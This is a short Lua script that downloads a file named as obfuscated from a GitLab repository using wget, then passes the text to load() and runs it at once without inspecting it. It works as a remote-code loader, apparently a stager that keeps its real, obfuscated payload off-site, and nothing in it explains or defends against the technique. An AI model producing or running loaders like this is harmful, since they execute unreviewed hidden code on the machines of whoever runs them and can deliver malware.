local url = "https://gitlab.com/nexus.personnal/vias/-/raw/master/obfuscated_5631bf90.lua?ref_type=heads"

local p = assert(io.popen('wget -qO- "' .. url .. '"', "r"))
local code = p:read("*a")
p:close()

assert(code and #code > 0, "Failed to download GitLab script")

local fn, err = load(code)
assert(fn, err)

return fn()
